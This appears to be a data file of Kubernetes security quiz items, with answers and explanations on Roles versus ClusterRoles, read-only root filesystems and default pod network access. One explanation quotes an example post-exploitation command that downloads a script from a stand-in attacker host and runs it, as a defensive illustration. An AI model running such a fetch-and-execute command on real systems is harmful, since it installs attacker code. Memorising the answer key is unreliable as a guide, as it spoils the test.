questions.question: What is the difference between a Kubernetes 'Role' and a 'ClusterRole', and when would you use each?
options: A Role has higher privileges than a ClusterRole because it is more specific.

A Role grants permissions scoped to a single namespace (e.g., only pods in the 'production' namespace). A ClusterRole grants permissions across all namespaces or for cluster-level resources (like Nodes and PersistentVolumes that don't belong to any namespace).
A Role is for human users; a ClusterRole is for ServiceAccounts.
A Role applies at runtime; a ClusterRole is evaluated at admission time.
questions.answer: A Role grants permissions scoped to a single namespace (e.g., only pods in the 'production' namespace). A ClusterRole grants permissions across all namespaces or for cluster-level resources (like Nodes and PersistentVolumes that don't belong to any namespace).
questions.explanation: Give a monitoring tool a Role to read pods in its own namespace. Give a cluster-admin tool a ClusterRole. Always prefer the narrower Role when possible — least-privilege principle.

questions.question: What specific security attack does setting 'readOnlyRootFilesystem: true' in a Pod Security Context prevent?
options: It prevents the pod from reading files from other pods' volumes.

It prevents malware or an attacker who exploits a vulnerability from writing files to the container's filesystem — stopping them from installing backdoors, modifying binaries, creating cron jobs, or dropping exploit scripts onto the container's writable layer.
It makes the container's image layers read-only in the container registry.
It prevents the container from reading Kubernetes Secrets mounted as volumes.
questions.answer: It prevents malware or an attacker who exploits a vulnerability from writing files to the container's filesystem — stopping them from installing backdoors, modifying binaries, creating cron jobs, or dropping exploit scripts onto the container's writable layer.
questions.explanation: A common post-exploitation step is 'curl https://attacker.com/payload.sh > /tmp/payload.sh && bash /tmp/payload.sh'. With readOnlyRootFilesystem=true, this write to /tmp fails immediately.

questions.question: Without a Kubernetes Network Policy, what network access does a newly compromised pod have by default?
options: A compromised pod can only reach pods in its own namespace.

By default, Kubernetes has no network isolation — a compromised pod can initiate TCP connections to any other pod in any namespace cluster-wide, including reaching the production database, the payment processing service, and pods in other teams' namespaces.
By default, pods can only reach external internet resources, not other pods.
By default, pods can only receive inbound traffic, not initiate outbound connections.
questions.answer: By default, Kubernetes has no network isolation — a compromised pod can initiate TCP connections to any other pod in any namespace cluster-wide, including reaching the production database, the payment processing service, and pods in other teams' namespaces.
questions.explanation: This is why Network Policies are critical in multi-tenant clusters. A compromised frontend pod should NEVER be able to directly connect to the database. Network Policies enforce this boundary.
